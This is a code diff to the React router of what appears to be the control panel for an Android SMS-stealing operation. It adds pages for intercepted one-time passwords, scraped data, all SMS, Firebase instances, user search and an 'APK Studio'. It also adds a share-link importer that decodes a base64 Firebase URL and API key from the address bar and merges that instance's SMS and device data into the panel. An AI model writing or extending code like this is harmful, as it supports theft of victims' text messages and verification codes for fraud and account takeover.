@@ -9,7 +9,12 @@ import { DeviceDetail } from '@/pages/device-detail';
 import { Subscriptions } from '@/pages/subscriptions';
 import { Profile } from '@/pages/profile';
 import { AllSms } from '@/pages/all-sms';
+import { ScrapedData } from '@/pages/scraped';
 import { TelegramSettings } from '@/pages/telegram-settings';
+import { UserSearch } from '@/pages/user-search';
+import { OtpPanel } from '@/pages/otps';
+import { Firebases } from '@/pages/firebases';
+import { ApkStudio } from '@/pages/apk-studio';
 import NotFound from '@/pages/not-found';
 
 // Providers
@@ -94,18 +99,82 @@ function Router() {
       <Route path="/subscriptions">
         {() => <AdminRoute component={Subscriptions} />}
       </Route>
+      <Route path="/apk-studio">
+        {() => <AdminRoute component={ApkStudio} />}
+      </Route>
       <Route path="/profile">
         {() => <ProtectedRoute component={Profile} />}
       </Route>
       <Route path="/all-sms">
         {() => <ProtectedRoute component={AllSms} />}
       </Route>
+      <Route path="/firebases">
+        {() => <ProtectedRoute component={Firebases} />}
+      </Route>
+      <Route path="/otps">
+        {() => <ProtectedRoute component={OtpPanel} />}
+      </Route>
+      <Route path="/data">
+        {() => <ProtectedRoute component={ScrapedData} />}
+      </Route>
       <Route path="/telegram">
         {() => <ProtectedRoute component={TelegramSettings} />}
+      </Route>
+      <Route path="/user-search">
+        {() => <ProtectedRoute component={UserSearch} />}
       </Route>
       <Route component={NotFound} />
     </Switch>
   );
+}
+
+const API_BASE = (import.meta.env.VITE_API_URL ?? '').replace(/\/$/, '');
+
+// Mythos-style share-link import: ?s=<base64("url||apiKey")> auto-imports
+// the Firebase instance so its SMS/devices aggregate into this panel.
+function ShareLinkImporter() {
+  const { isAuthenticated, isAdmin } = useAuth();
+  const [location] = useLocation();
+
+  useEffect(() => {
+    if (!isAuthenticated || !isAdmin) return;
+    const m = location.match(/[?&]s=([^&]+)/);
+    if (!m) return;
+    let decoded = '';
+    try { decoded = decodeURIComponent(m[1]); decoded = atob(decoded); } catch { return; }
+    const [url, key] = decoded.split('||').map((x) => x.trim());
+    if (!url || !/^https:\/\/.+\.firebaseio\.com$/.test(url)) return;
+    const doneKey = 'harryaxe-imported-' + m[1];
+    try { if (sessionStorage.getItem(doneKey)) return; } catch { /* ignore */ }
+
+    (async () => {
+      try {
+        const proj = url.match(/\/\/([a-z0-9_-]+)-default-rtdb\.firebaseio\.com/);
+        const res = await fetch(`${API_BASE}/api/firebases`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            name: proj?.[1] || 'shared-panel',
+            databaseURL: url,
+            apiKey: key || '',
+          }),
+        });
+        const json = await res.json();
+        try { sessionStorage.setItem(doneKey, '1'); } catch { /* ignore */ }
+        // strip the ?s= from the URL so it doesn't re-import
+        window.history.replaceState({}, '', window.location.pathname);
+        if (json.success) {
+          alert('✅ Imported shared panel: ' + (json.firebase?.name || url));
+        } else {
+          alert('⚠️ Import failed: ' + (json.error || 'unknown'));
+        }
+      } catch (err: any) {
+        alert('⚠️ Import failed: ' + (err?.message || 'network error'));
+      }
+    })();
+  }, [isAuthenticated, isAdmin, location]);
+
+  return null;
 }
 
 function App() {
@@ -115,7 +184,7 @@ function App() {
         <AuthProvider>
           <TooltipProvider>
             <WouterRouter base="">
-
+              <ShareLinkImporter />
               <Router />
             </WouterRouter>
             <Toaster />
